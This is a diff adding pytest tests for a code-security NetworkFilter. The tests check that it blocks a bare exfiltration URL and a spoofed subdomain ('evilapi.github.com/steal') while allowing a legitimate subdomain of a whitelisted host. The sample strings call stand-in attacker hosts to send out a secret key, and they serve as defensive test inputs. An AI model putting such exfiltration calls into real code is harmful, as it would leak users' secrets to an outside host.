@@ -76,3 +76,17 @@ def test_blocks_bare_url_literal(default_policy: SecurityPolicy) -> None:
     code = 'data = "https://evil.com/exfiltrate?key=secret"'
     with pytest.raises(SecurityBlockedError):
         NetworkFilter(default_policy).validate(code)
+
+
+def test_blocks_subdomain_spoofing(permissive_policy: SecurityPolicy) -> None:
+    """evilapi.github.com must NOT match whitelisted api.github.com."""
+    code = 'requests.get("https://evilapi.github.com/steal")'
+    with pytest.raises(SecurityBlockedError) as exc_info:
+        NetworkFilter(permissive_policy).validate(code)
+    assert "evilapi.github.com" in str(exc_info.value)
+
+
+def test_allows_exact_subdomain(permissive_policy: SecurityPolicy) -> None:
+    """sub.api.github.com SHOULD match api.github.com (legit subdomain)."""
+    code = 'requests.get("https://sub.api.github.com/data")'
+    NetworkFilter(permissive_policy).validate(code)  # Should not raise
